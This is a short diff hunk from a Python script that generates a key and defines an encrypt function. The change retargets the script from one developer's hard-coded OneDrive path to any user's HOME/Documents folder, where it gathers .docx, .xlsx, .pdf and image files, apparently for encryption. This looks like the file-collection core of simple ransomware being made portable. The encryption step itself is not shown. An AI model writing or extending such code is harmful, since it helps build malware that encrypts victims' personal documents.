@@ -33,11 +33,11 @@ def encrypt(file_in_bytes, key):
 
 def main():
     key = gen_key()
-    mypath = r"C:\Users\hdext\OneDrive\Documentos"
+    main_path = os.environ["HOME"] + "/Documents"
     extensions = [".docx",".xlsx", ".pdf", ".jpeg", ".jpg"]
     files = []
-    for f in listdir(mypath):
-        file = join(mypath, f)
+    for f in listdir(main_path):
+        file = join(main_path, f)
         if isfile(file):
             if file.endswith(tuple(extensions)):
                 files.append(file)
